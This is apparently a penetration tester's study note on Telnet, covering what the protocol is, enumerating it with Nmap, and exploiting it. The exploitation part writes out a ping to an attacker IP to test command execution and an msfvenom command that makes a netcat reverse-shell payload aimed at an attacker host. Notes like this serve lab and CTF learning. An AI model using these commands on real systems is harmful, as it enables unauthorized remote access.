## What is Telnet?
An application protocol which allows you, with the use of a **telnet client**, to connect to and execute commands on a remote machine that is hosting a **telnet server.**
- Client establishes connection with server. Client will then become virtual terminal, allowing interaction with remote host.
- Telnet sends messages in **clear text** without any security measures.
```bash
telnet [ip] [port]
```
### Telnet has slowly been phased out in favor of SSH

## Enumerating Telnet
- **Begin with [[Penetration Testing/Nmap|Nmap]] 
- Attempt to connect to Telnet port as client to enumerate.

## Exploiting Telnet
- Attempt to run commands using Telnet session.

### TCPdump
If no command execution, set tcpdump listener on attacker machine to catch icmp and attempt to ping it from Telnet.
```bash
sudo tcpdump ip proto \\icmp -i [socket of local IP, ie tun0]
```

From Telnet session, attempt to ping attacker IP to determine if Telnet is able to run system commands.
```bash
.RUN ping [attacker IP] -c 1
```
- if ping is received, Telnet is able to run system commands.

### Msfvenom
Use msfvenome to craft payload for rev shell using netcat
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=[attacker ip] lport=4444 R
```
- Set listener of attack machine
- Copy generated payload into Telnet to obtain shell.
